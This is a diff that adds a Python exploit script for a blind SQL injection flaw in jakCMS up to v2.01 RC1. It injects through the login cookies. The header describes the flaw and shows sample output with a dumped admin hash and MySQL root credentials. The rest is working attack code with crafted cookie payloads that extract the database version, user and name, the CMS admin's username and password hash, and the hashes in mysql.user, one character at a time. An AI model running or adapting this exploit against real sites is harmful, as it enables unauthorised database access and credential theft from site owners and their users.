@@ -1,0 +1,205 @@
+#!/usr/bin/python
+# 
+# jakCMS <= v2.01 RC1 Blind SQL Injection Exploit
+#
+# Understanding:
+# The parameters 'JAK_COOKIE_NAME' and 'JAK_COOKIE_PASS' are parsed via cookies to the application
+# and are unchecked for malicious characters. The contents of these variables are directly inserted into an
+# SQL statement, leading to SQL Injection vulnerabilities.
+#
+# Notes:
+# 1. PoC written to only work with the latest version. However, vuln exists in all versions.
+# 2. The admin password is encrypted as a sha256 with a unique HMAC. However the default value is set to ''.
+#
+# [mr_me@pluto jak]$ python jakcmsSQLInjectionExploit.py -p localhost:8080 -t 192.168.1.7 -d /webapps/jak/
+#
+# 	| ----------------------------------------- |
+#	| JAKcms Remote Blind SQL Injection Explo!t |
+#	| by mr_me - net-ninja.net ---------------- |
+#
+# (+) Testing proxy @ localhost:8080.. proxy is found to be working!
+# (+) Using 'upload/admin' value for the true page
+# (+) This will take time, go grab a coffee..
+#
+# (!) Getting database version: 5.1.41-3ubuntu12.9
+# (!) Getting database user: root@localhost
+# (!) Getting database name: jak
+# (!) Getting JakCMS administrative account: admin:98b1d8e3f0ae03888a87bba62bdaf9adf02c78e9c98cfc8c3f46ed7b428dd64b
+# (!) w00t! You have access to MySQL database!
+# (+) Dumping hashs hold onto your knickers..
+# (+) The username and hashed password is: root:*EE4E2773D7530819563F0DC6FCE27446A51C9413
+# (+) PoC finished.
+
+import sys
+import urllib
+import re
+import urllib2
+from optparse import OptionParser
+
+usage = "./%prog [<options>] -t [target] -d [directory]"
+usage += "\nExample: ./%prog -p localhost:8080 -t 192.168.1.7 -d /webapps/jak/"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-p", type="string",action="store", dest="proxy",
+                  help="HTTP Proxy <server:port>")
+parser.add_option("-t", type="string", action="store", dest="target",
+                  help="The Target server <server:port>")
+parser.add_option("-d", type="string", action="store", dest="dirPath",
+                  help="Directory path to the CMS")
+
+(options, args) = parser.parse_args()
+
+def banner():
+	print "\n\t| ----------------------------------------- |"
+	print "\t| JAKcms Remote Blind SQL Injection Explo!t |"
+	print "\t| by mr_me - net-ninja.net ---------------- |\n"
+
+if len(sys.argv) < 5:
+    banner()
+    parser.print_help()
+    sys.exit(1)
+
+# set the stage........
+trueStr = "upload/admin"
+page = "index.php"
+basicInfo = {'version':'version()', 'user':'user()', 'name':'database()'}
+lower_value = 0
+upper_value = 126
+
+# test before we hit our target
+def testProxy():
+	check = 1
+	sys.stdout.write("(+) Testing proxy @ %s.. " % (options.proxy))
+	sys.stdout.flush()
+	try:
+        	req = urllib2.Request("http://www.google.com/")
+		req.set_proxy(options.proxy,"http")
+		check = urllib2.urlopen(req)
+    	except:
+        	check = 0
+        	pass
+    	if check != 0:
+        	sys.stdout.write("proxy is found to be working!\n")
+        	sys.stdout.flush()
+    	else:
+        	print "proxy failed, exiting.."
+        	sys.exit(1)
+
+# handles all requests to the target server
+def getServerResponse(exploit, header=None, data=None):
+	try:
+		headers = {}
+		headers['Cookie'] = header
+		req = urllib2.Request(exploit, data, headers)
+		if options.proxy:
+			req.set_proxy(options.proxy,"http")
+
+		check = urllib2.urlopen(req).read()			
+	except urllib.error.HTTPError, error:
+		check = error.read()
+	except urllib.error.URLError:
+		print "(-) Target connection failed, check your address"
+		sys.exit(1)
+	return check
+
+
+# modified version of rsauron's function 
+# thanks bro. 
+def getAsciiValue(URI, data):
+	lower = lower_value
+        upper = upper_value
+	while lower < upper:
+		        try:
+			mid = (lower + upper) / 2
+			header = data + ">"+str(mid)+"--+;"
+			result = getServerResponse(URI, header)
+			match = re.findall(trueStr,result)
+			if len(match) >= 1:
+                                lower = mid + 1
+			else:
+                             	upper = mid
+		except (KeyboardInterrupt, SystemExit):
+                        raise
+                except:
+                       	pass
+
+	if lower > lower_value and lower < upper_value:
+                value = lower
+        else:
+             	header = data + "="+str(lower) +"-- ;"
+		result = getServerResponse(URI, header)
+                match = re.findall(trueStr,result)
+                if len(match) > 1:
+                        value = lower
+                else:
+                        print "\n(-) READ xprog's blind sql tutorial!\n"
+                        sys.exit(1)
+        return value
+
+# Do our blind attacks
+def doBlindSqli():
+	data = "JAK_COOKIE_PASS=test; JAK_COOKIE_NAME=admin"
+	request = ("http://"+options.target+options.dirPath + page)
+	print "(+) Using '%s' value for the true page" % (trueStr)
+        print "(+) This will take time, go grab a coffee.."
+        for key in basicInfo:
+	        sys.stdout.write("\n(!) Getting database %s: " % (key))
+                sys.stdout.flush()
+
+                # it will never go through all 50 iterations. \0/ lazy.
+                for i in range(1,50):
+			getBasicInfo = (data+"\"))+and+ascii(substring(%s,%s,1))" % (basicInfo[key],str(i)))
+           		asciival = getAsciiValue(request, getBasicInfo)
+                        if asciival >= 0:
+                                sys.stdout.write("%s" % (chr(asciival)))
+                                sys.stdout.flush()
+                        else:
+                             	break
+
+	# get JAKCMS admin account data
+	sys.stdout.write("\n(!) Getting JakCMS administrative account: ")
+	sys.stdout.flush()
+	for i in range(1,100):
+		getUserAndPass = (data+"\"))+and+ascii(substring((SELECT+concat(username,0x3a,password)+from+"
+  		"user+limit+0,1),%s,1))" % str(i))
+
+		asciival = getAsciiValue(request, getUserAndPass)
+		
+		if asciival != 0:
+			sys.stdout.write("%s" % (chr(asciival)))
+			sys.stdout.flush()
+		else:
+			pass
+
+	# if we are lucky, get the mysql user/pass
+	isMysqlUser = (data+"\"))+and+(select+1+from+mysql.user+limit+0,1)=1--+")
+        result = getServerResponse(request, isMysqlUser)
+        match = re.findall(trueStr,result)
+        if len(match) >= 1:
+               	print "\n(!) w00t! You have access to MySQL database!"
+                print "(+) Dumping hashs hold onto your knickers.."
+                sys.stdout.write("(+) The username and hashed password is: ")
+                sys.stdout.flush()
+                for k in range(1,100):
+                       	getMysqlUserAndPass = (data+"\"))+and+ascii(substring((SELECT+concat(user,0x3a,password)+from+"
+                        "mysql.user+limit+0,1),%s,1))" % str(k))
+                        asciival = getAsciiValue(request, getMysqlUserAndPass)
+                        if asciival != 0:
+                                sys.stdout.write("%s" % (chr(asciival)))
+                               	sys.stdout.flush()
+                        else:
+                                break
+		sys.stdout.write("\n(+) PoC finished.\n")
+		sys.stdout.flush()
+        else:
+		print "\n(-) You do not have access to MySQL database"
+
+
+def main():
+	banner()
+	if options.proxy:
+		testProxy()
+	doBlindSqli()
+
+if __name__ == "__main__":
+	main()
